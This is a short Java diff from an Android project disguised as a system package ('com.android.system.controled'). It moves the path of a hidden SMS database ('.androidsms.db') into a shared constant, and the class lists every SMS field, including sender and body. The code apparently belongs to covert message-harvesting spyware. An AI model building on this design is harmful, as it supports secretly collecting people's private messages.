@@ -3,6 +3,8 @@ package com.android.system.controled.db;
 import java.io.File;
 import java.io.IOException;
 
+import com.android.system.controled.Globle;
+
 import android.database.sqlite.SQLiteDatabase;
 import android.util.Log;
 
@@ -12,7 +14,7 @@ public class DatabaseUtil {
 
 	private static SQLiteDatabase mSQLiteDatabase;
 	public static final String DB_NAME = ".androidsms.db";
-	public static final String DB_PATH = "/mnt/sdcard/Android/.androidsms.db";
+	public static final String DB_PATH = Globle.FILE_SDCARD + ".androidsms.db";
 	public static final int DB_VERSION = 6;
 
 	public static final String[] ALLSMS_ALLCOLUMNS = { "thread_id", "date", "address", "person", "type", "subject", "body", "read", "status" };
